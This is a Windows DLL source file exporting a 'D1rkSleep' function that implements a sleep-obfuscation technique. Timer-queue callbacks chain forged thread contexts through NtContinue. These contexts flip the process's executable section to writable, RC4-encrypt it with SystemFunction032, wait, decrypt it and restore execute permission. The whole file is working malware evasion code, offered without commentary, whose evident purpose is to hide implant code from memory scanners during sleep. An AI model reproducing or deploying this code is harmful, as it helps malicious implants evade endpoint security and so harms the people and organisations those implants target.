#define _CRT_RAND_S
#include <Windows.h>

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define NtCurrentThread() ((HANDLE)(LONG_PTR)-2)
#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)

typedef struct {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} USTRING;

VOID D1rkCrypt(DWORD SleepTime)
{
    DWORD OldProtect = 0;

    PVOID ImageBase = GetModuleHandle(NULL);
    PIMAGE_DOS_HEADER pDOS = (PIMAGE_DOS_HEADER)ImageBase;
    PIMAGE_NT_HEADERS pNT = (PIMAGE_NT_HEADERS)((DWORD64)ImageBase + pDOS->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNT);

    // === FIND .text SECTION ONLY (correct in-memory addressing) ===
    LPVOID textBase = NULL;
    DWORD  textSize = 0;
    for (WORD i = 0; i < pNT->FileHeader.NumberOfSections; i++)
    {
        if (pSection->Characteristics & IMAGE_SCN_MEM_EXECUTE)
        {
            textBase = (LPVOID)((DWORD64)ImageBase + pSection->VirtualAddress);
            textSize = pSection->Misc.VirtualSize;
            break;
        }
        pSection++;
    }
    if (textBase == NULL || textSize == 0) return;

    CONTEXT CtxThread   = { 0 };
    CONTEXT RopProtRW   = { 0 };
    CONTEXT RopMemEnc   = { 0 };
    CONTEXT RopDelay    = { 0 };
    CONTEXT RopMemDec   = { 0 };
    CONTEXT RopProtRX   = { 0 };
    CONTEXT RopSetEvt   = { 0 };

    HANDLE hTimerQueue = NULL;
    HANDLE hNewTimer   = NULL;
    HANDLE hEvent      = NULL;

    CHAR KeyBuf[16];
    unsigned int r = 0;
    for (int i = 0; i < 16; i++) {
        rand_s(&r);
        KeyBuf[i] = (CHAR)r;
    }

    USTRING Key = { 0 };
    USTRING Img = { 0 };

    PVOID NtContinue = GetProcAddress(GetModuleHandleA("ntdll"), "NtContinue");
    PVOID SysFunc032 = GetProcAddress(LoadLibraryA("advapi32"), "SystemFunction032");

    Key.Buffer = KeyBuf;
    Key.Length = Key.MaximumLength = 16;

    Img.Buffer = textBase;
    Img.Length = Img.MaximumLength = textSize;

    hEvent      = CreateEventW(NULL, FALSE, FALSE, NULL);
    hTimerQueue = CreateTimerQueue();

    if (CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)RtlCaptureContext, &CtxThread, 0, 0, WT_EXECUTEINTIMERTHREAD))
    {
        WaitForSingleObject(hEvent, 50);

        memcpy(&RopProtRW, &CtxThread, sizeof(CONTEXT));
        memcpy(&RopMemEnc, &CtxThread, sizeof(CONTEXT));
        memcpy(&RopDelay,  &CtxThread, sizeof(CONTEXT));
        memcpy(&RopMemDec, &CtxThread, sizeof(CONTEXT));
        memcpy(&RopProtRX, &CtxThread, sizeof(CONTEXT));
        memcpy(&RopSetEvt, &CtxThread, sizeof(CONTEXT));

        // 1. RW
        RopProtRW.Rsp -= 8;
        RopProtRW.Rip = (DWORD64)VirtualProtect;
        RopProtRW.Rcx = (DWORD64)textBase;
        RopProtRW.Rdx = textSize;
        RopProtRW.R8  = PAGE_READWRITE;
        RopProtRW.R9  = (DWORD64)&OldProtect;

        // 2. Encrypt
        RopMemEnc.Rsp -= 8;
        RopMemEnc.Rip = (DWORD64)SysFunc032;
        RopMemEnc.Rcx = (DWORD64)&Img;
        RopMemEnc.Rdx = (DWORD64)&Key;

        // 3. Sleep (unhooked via process handle timeout)
        RopDelay.Rsp -= 8;
        RopDelay.Rip = (DWORD64)WaitForSingleObject;
        RopDelay.Rcx = (DWORD64)NtCurrentProcess();
        RopDelay.Rdx = SleepTime;

        // 4. Decrypt
        RopMemDec.Rsp -= 8;
        RopMemDec.Rip = (DWORD64)SysFunc032;
        RopMemDec.Rcx = (DWORD64)&Img;
        RopMemDec.Rdx = (DWORD64)&Key;

        // 5. RX
        RopProtRX.Rsp -= 8;
        RopProtRX.Rip = (DWORD64)VirtualProtect;
        RopProtRX.Rcx = (DWORD64)textBase;
        RopProtRX.Rdx = textSize;
        RopProtRX.R8  = PAGE_EXECUTE_READ;
        RopProtRX.R9  = (DWORD64)&OldProtect;

        // 6. Signal done
        RopSetEvt.Rsp -= 8;
        RopSetEvt.Rip = (DWORD64)SetEvent;
        RopSetEvt.Rcx = (DWORD64)hEvent;

        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopDelay,  300, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopMemDec, 400, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopProtRX, 500, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD);

        WaitForSingleObject(hEvent, INFINITE);
    }

    if (hTimerQueue) DeleteTimerQueueEx(hTimerQueue, NULL);
}

extern "C" __declspec(dllexport) VOID WINAPI D1rkSleep(DWORD dwMilliseconds)
{
    if (dwMilliseconds == 0) return;
    D1rkCrypt(dwMilliseconds);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        break;
    }
    return TRUE;
}

